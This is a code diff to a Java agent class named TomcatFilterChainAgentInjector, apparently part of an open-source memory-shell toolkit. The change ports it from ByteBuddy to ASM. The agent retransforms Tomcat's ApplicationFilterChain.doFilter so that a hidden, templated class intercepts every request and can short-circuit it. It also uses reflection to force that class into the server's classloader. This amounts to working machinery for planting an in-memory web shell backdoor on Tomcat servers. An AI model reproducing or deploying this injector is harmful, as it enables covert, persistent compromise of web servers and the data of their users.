@@ -1,39 +1,25 @@
 package com.reajason.javaweb.memshell.injector.tomcat;
 
-import net.bytebuddy.agent.builder.AgentBuilder;
-import net.bytebuddy.asm.Advice;
-import net.bytebuddy.description.type.TypeDescription;
-import net.bytebuddy.dynamic.DynamicType;
-import net.bytebuddy.matcher.ElementMatchers;
-import net.bytebuddy.utility.JavaModule;
+import org.objectweb.asm.*;
+import org.objectweb.asm.commons.AdviceAdapter;
+import org.objectweb.asm.commons.Method;
 
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
 
-import static net.bytebuddy.matcher.ElementMatchers.named;
-
 /**
  * @author ReaJason
- * @since 2024/12/28
+ * @since 2025/3/26
  */
-public class TomcatFilterChainAgentInjector implements AgentBuilder.Transformer {
+public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
+    private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";
+    private static final String TARGET_METHOD_NAME = "doFilter";
 
-    static Class<?> interceptorClass = null;
-
-    static {
-        try {
-            interceptorClass = Class.forName(getClassName());
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        }
-    }
-
-    @Override
-    public DynamicType.Builder<?> transform(DynamicType.Builder<?> builder,
-                                            TypeDescription typeDescription,
-                                            ClassLoader classLoader, JavaModule module,
-                                            ProtectionDomain protectionDomain) {
-        return builder.visit(Advice.to(interceptorClass).on(named("doFilter")));
+    public static String getClassName() {
+        return "{{advisorName}}";
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -44,21 +30,118 @@ public class TomcatFilterChainAgentInjector implements AgentBuilder.Transformer 
         launch(inst);
     }
 
-    public static String getClassName() {
-        return "{{advisorName}}";
-    }
-
     private static void launch(Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
-        new AgentBuilder.Default()
-                .ignore(ElementMatchers.none())
-                .disableClassFormatChanges()
-                .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
-//                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
-//                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
-                .type(named("org.apache.catalina.core.ApplicationFilterChain"))
-                .transform(new TomcatFilterChainAgentInjector())
-                .installOn(inst);
+        inst.addTransformer(new TomcatFilterChainAgentInjector(), true);
+        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
+            String name = allLoadedClass.getName();
+            if (TARGET_CLASS.replace("/", ".").equals(name)) {
+                inst.retransformClasses(allLoadedClass);
+            }
+        }
         System.out.println("MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter");
+    }
+
+    @Override
+    @SuppressWarnings("all")
+    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] bytes) {
+        if (TARGET_CLASS.equals(className)) {
+            defineTargetClass(loader);
+            try {
+                ClassReader cr = new ClassReader(bytes);
+                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+                    @Override
+                    protected ClassLoader getClassLoader() {
+                        return loader;
+                    }
+                };
+                ClassVisitor cv = getClassVisitor(cw);
+                cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                return cw.toByteArray();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return bytes;
+    }
+
+    @SuppressWarnings("all")
+    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
+        return new ClassVisitor(Opcodes.ASM9, cv) {
+            @Override
+            public MethodVisitor visitMethod(int access, String name, String descriptor,
+                                             String signature, String[] exceptions) {
+                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+                if (TARGET_METHOD_NAME.equals(name)) {
+                    try {
+                        return new CustomMethodVisitor(mv, access, name, descriptor);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+                return mv;
+            }
+        };
+    }
+
+    @SuppressWarnings("all")
+    public static class CustomMethodVisitor extends AdviceAdapter {
+        private static final Method CUSTOM_EQUALS_CONSTRUCTOR = Method.getMethod("void <init> ()");
+        private static final Method CUSTOM_EQUALS_METHOD = Method.getMethod("boolean equals (java.lang.Object)");
+        private final Type customEqualsType;
+
+        protected CustomMethodVisitor(MethodVisitor mv, int access, String name, String descriptor) {
+            super(Opcodes.ASM9, mv, access, name, descriptor);
+            customEqualsType = Type.getObjectType(getClassName().replace('.', '/'));
+        }
+
+        @Override
+        protected void onMethodEnter() {
+            loadArgArray();
+            newInstance(customEqualsType);
+            dup();
+            invokeConstructor(customEqualsType, CUSTOM_EQUALS_CONSTRUCTOR);
+            swap();
+            invokeVirtual(customEqualsType, CUSTOM_EQUALS_METHOD);
+            Label skipReturnLabel = new Label();
+            mv.visitJumpInsn(IFEQ, skipReturnLabel);
+            mv.visitInsn(RETURN);
+            mark(skipReturnLabel);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public void defineTargetClass(ClassLoader loader) {
+        byte[] classBytecode = new byte[0];
+        InputStream is = null;
+        try {
+            is = this.getClass().getClassLoader().getResourceAsStream(getClassName().replace('.', '/') + ".class");
+            if (is == null) {
+                return;
+            }
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = is.read(buffer)) != -1) {
+                baos.write(buffer, 0, len);
+            }
+            classBytecode = baos.toByteArray();
+        } catch (Exception ignored) {
+
+        } finally {
+            if (is != null) {
+                try {
+                    is.close();
+                } catch (Exception ignored) {
+                }
+            }
+        }
+        try {
+            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
+        } catch (Exception ignored) {
+        }
     }
 }
